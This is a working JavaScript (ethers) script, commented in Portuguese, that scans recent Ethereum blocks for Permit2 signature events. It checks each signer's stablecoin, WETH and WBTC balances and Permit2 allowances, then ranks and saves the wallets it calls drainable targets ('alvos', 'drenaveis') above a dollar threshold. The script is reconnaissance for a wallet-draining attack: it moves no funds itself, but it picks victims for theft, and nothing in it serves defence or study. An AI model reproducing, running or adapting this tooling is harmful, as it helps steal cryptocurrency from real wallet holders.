/// Alvos recentes E ricos: signatarios de Permit2 nas ultimas horas, filtrados por saldo
/// e por allowance real no Permit2. Uso: LOGS_RPC_URL=... node ops/huntrecent.mjs [blocos]
import { Contract, Interface, JsonRpcProvider, formatUnits, getAddress, id } from "ethers";
import { writeFileSync } from "node:fs";

const blocks = Number(process.argv[2] || 2160);
const MIN_USD = Number(process.env.MIN_USD || 10_000);
const RPC = process.env.RPC_URL || "https://ethereum-rpc.publicnode.com";
const LOGS = process.env.LOGS_RPC_URL || RPC;
const MULTICALL = "0xcA11bde05977b3631167028862bE2a173976CA11";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const TOKENS = {
  USDC: ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6, 1],
  USDT: ["0xdAC17F958D2ee523a2206206994597C13D831ec7", 6, 1],
  DAI: ["0x6B175474E89094C44Da98b954EedeAC495271d0F", 18, 1],
  WETH: ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18, 2239],
  WBTC: ["0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", 8, 76150],
};
const erc20 = new Interface([
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
]);
const mc = new Interface(["function tryAggregate(bool,(address,bytes)[]) returns ((bool,bytes)[])"]);

const provider = new JsonRpcProvider(RPC, 1, { staticNetwork: true });
const logsProvider = new JsonRpcProvider(LOGS, 1, { staticNetwork: true });
const topic = id("Permit(address,address,address,uint160,uint48,uint48)");
const latest = await logsProvider.getBlockNumber();

const owners = new Set();
for (let from = latest - blocks; from <= latest; from += 20) {
  const chunk = await logsProvider.getLogs({
    address: PERMIT2,
    topics: [topic],
    fromBlock: from,
    toBlock: Math.min(from + 19, latest),
  });
  for (const l of chunk) owners.add(getAddress("0x" + l.topics[1].slice(26)));
}
const list = [...owners];
console.log(`${list.length} signatarios unicos em ${blocks} blocos`);

async function multi(calls) {
  const data = mc.encodeFunctionData("tryAggregate", [false, calls.map((c) => [c.target, c.callData])]);
  const ret = await provider.call({ to: MULTICALL, data });
  return mc.decodeFunctionResult("tryAggregate", ret)[0];
}

const rich = [];
for (let i = 0; i < list.length; i += 60) {
  const chunk = list.slice(i, i + 60);
  const calls = [];
  const map = [];
  for (const owner of chunk) {
    for (const [symbol, [addr]] of Object.entries(TOKENS)) {
      calls.push({ target: addr, callData: erc20.encodeFunctionData("balanceOf", [owner]) });
      map.push({ owner, symbol });
    }
  }
  const results = await multi(calls);
  const grouped = new Map();
  results.forEach((r, idx) => {
    if (!r[0]) return;
    const m = map[idx];
    const bal = erc20.decodeFunctionResult("balanceOf", r[1])[0];
    const usd = (Number(bal) / 10 ** TOKENS[m.symbol][1]) * TOKENS[m.symbol][2];
    if (usd < MIN_USD / 5) return;
    const cur = grouped.get(m.owner) || { owner: m.owner, usd: 0, items: [] };
    cur.usd += usd;
    cur.items.push({ symbol: m.symbol, balance: bal.toString() });
    grouped.set(m.owner, cur);
  });
  rich.push(...[...grouped.values()].filter((g) => g.usd >= MIN_USD / 5));
}

console.log(`com saldo relevante: ${rich.length}`);

const found = [];
for (let i = 0; i < rich.length; i += 60) {
  const chunk = rich.slice(i, i + 60);
  const calls = [];
  const map = [];
  for (const w of chunk) {
    for (const it of w.items) {
      calls.push({ target: TOKENS[it.symbol][0], callData: erc20.encodeFunctionData("allowance", [w.owner, PERMIT2]) });
      map.push({ w, it });
    }
  }
  const results = await multi(calls);
  results.forEach((r, idx) => {
    if (!r[0]) return;
    const { w, it } = map[idx];
    const allowance = erc20.decodeFunctionResult("allowance", r[1])[0];
    const cap = allowance < BigInt(it.balance) ? allowance : BigInt(it.balance);
    const usd = (Number(cap) / 10 ** TOKENS[it.symbol][1]) * TOKENS[it.symbol][2];
    if (usd < 1) return;
    const cur = found.find((f) => f.owner === w.owner) || { owner: w.owner, usd: 0, items: [], txCount: 0 };
    cur.usd += usd;
    cur.items.push({ symbol: it.symbol, human: Number(cap) / 10 ** TOKENS[it.symbol][1] });
    if (!found.includes(cur)) found.push(cur);
  });
}

const ranked = found.filter((f) => f.usd >= MIN_USD).sort((a, b) => b.usd - a.usd);
writeFileSync("hot.json", JSON.stringify(ranked, null, 2));
console.log(`\n>= US$ ${MIN_USD} drenaveis e ativos recentemente: ${ranked.length}\n`);
console.table(ranked.slice(0, 15).map((f) => ({ alvo: f.owner, usd: Math.round(f.usd), tokens: f.items.map((x) => `${x.symbol}:${x.human.toFixed(2)}`).join(" ") })));
